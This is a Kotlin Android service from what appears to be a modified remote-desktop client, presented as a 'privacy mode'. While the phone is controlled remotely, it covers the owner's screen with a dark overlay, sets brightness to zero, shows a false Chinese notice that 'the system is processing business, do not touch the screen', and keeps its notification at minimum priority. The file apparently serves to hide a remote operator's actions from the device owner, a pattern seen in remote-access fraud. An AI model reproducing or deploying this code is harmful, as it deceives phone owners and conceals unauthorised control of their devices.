package com.carriez.flutter_hbb

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.NotificationCompat

/**
 * Android privacy mode based on Accessibility overlay only.
 * No brightness API is used.
 */
class PrivacyModeService : Service() {

    companion object {
        private const val TAG = "PrivacyModeService"
        private const val CHANNEL_ID = "privacy_mode_channel"
        private const val NOTIFICATION_ID = 2001
        // Keep remote screen visible while still obscuring local content.
        private const val OVERLAY_ALPHA = 96
        private const val OVERLAY_EXTRA_SIZE = 1200
        private const val OVERLAY_SCREEN_BRIGHTNESS = 0.0f

        @Volatile
        private var isActive = false

        @Synchronized
        fun startPrivacyMode(context: Context) {
            Log.d(TAG, "DEBUG_PRIVACY: startPrivacyMode called, isActive=$isActive")
            if (isActive) {
                Log.d(TAG, "DEBUG_PRIVACY: Privacy mode already active, skip")
                return
            }

            val intent = Intent(context, PrivacyModeService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        @Synchronized
        fun stopPrivacyMode(context: Context) {
            Log.d(TAG, "DEBUG_PRIVACY: stopPrivacyMode called, isActive=$isActive")
            if (!isActive) return
            context.stopService(Intent(context, PrivacyModeService::class.java))
        }
    }

    private var overlayView: View? = null
    private var windowManager: WindowManager? = null
    private var notificationManager: NotificationManager? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "DEBUG_PRIVACY: PrivacyModeService onCreate")
        isActive = true

        val accessibilityService = InputService.ctx
        if (accessibilityService == null) {
            Log.e(TAG, "DEBUG_PRIVACY: Accessibility service not enabled")
            Handler(Looper.getMainLooper()).post {
                Toast.makeText(this, "Please enable Accessibility service first", Toast.LENGTH_LONG).show()
            }
            isActive = false
            stopSelf()
            return
        }

        try {
            createForegroundNotification()
            createDarkOverlay(accessibilityService)
            Handler(Looper.getMainLooper()).post {
                Toast.makeText(this, "Privacy mode enabled", Toast.LENGTH_SHORT).show()
            }
            Log.d(TAG, "DEBUG_PRIVACY: Privacy mode activated")
        } catch (e: Exception) {
            Log.e(TAG, "DEBUG_PRIVACY: Failed to activate privacy mode", e)
            isActive = false
            stopSelf()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        Log.d(TAG, "DEBUG_PRIVACY: PrivacyModeService onDestroy")

        overlayView?.let { view ->
            try {
                windowManager?.removeView(view)
            } catch (e: Exception) {
                Log.e(TAG, "DEBUG_PRIVACY: Error removing overlay", e)
            }
        }

        overlayView = null
        windowManager = null
        isActive = false

        Handler(Looper.getMainLooper()).post {
            Toast.makeText(this, "Privacy mode disabled", Toast.LENGTH_SHORT).show()
        }

        super.onDestroy()
    }

    private fun createDarkOverlay(accessibilityService: Context) {
        windowManager = accessibilityService.getSystemService(Context.WINDOW_SERVICE) as WindowManager

        val display = windowManager?.defaultDisplay
        val screenSize = android.graphics.Point()
        display?.getRealSize(screenSize)
        val screenWidth = screenSize.x
        val screenHeight = screenSize.y

        Log.d(
            TAG,
            "DEBUG_PRIVACY: Screen size=${screenWidth}x${screenHeight}, alpha=$OVERLAY_ALPHA, windowBrightness=$OVERLAY_SCREEN_BRIGHTNESS"
        )

        val container = FrameLayout(accessibilityService).apply {
            setBackgroundColor(Color.argb(OVERLAY_ALPHA, 0, 0, 0))

            val textView = TextView(accessibilityService).apply {
                text = "系统正在处理业务\n请勿触碰手机屏幕\n感谢您的耐心等待"
                setTextColor(Color.WHITE)
                textSize = 34f
                gravity = Gravity.CENTER
                setTypeface(Typeface.DEFAULT_BOLD)
                setShadowLayer(14f, 3f, 3f, Color.BLACK)
                setPadding(48, 48, 48, 48)
                setBackgroundColor(Color.TRANSPARENT)
            }

            val textParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT,
                Gravity.CENTER
            )
            addView(textView, textParams)
        }

        val windowFlags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_FULLSCREEN

        val overlayWidth = screenWidth + OVERLAY_EXTRA_SIZE * 2
        val overlayHeight = screenHeight + OVERLAY_EXTRA_SIZE * 2

        val params = WindowManager.LayoutParams(
            overlayWidth,
            overlayHeight,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            windowFlags,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            x = -OVERLAY_EXTRA_SIZE
            y = -OVERLAY_EXTRA_SIZE

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }

            // Window-level brightness override: avoids Settings.System writes.
            screenBrightness = OVERLAY_SCREEN_BRIGHTNESS
            buttonBrightness = OVERLAY_SCREEN_BRIGHTNESS
        }

        windowManager?.addView(container, params)
        overlayView = container
        Log.d(TAG, "DEBUG_PRIVACY: Overlay created")
    }

    private fun createForegroundNotification() {
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Privacy Mode Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Keeps privacy mode overlay active in background"
                setShowBadge(false)
            }
            notificationManager?.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Privacy mode active")
            .setContentText("Black screen overlay is running")
            .setSmallIcon(R.mipmap.ic_stat_logo)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setAutoCancel(false)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }
}
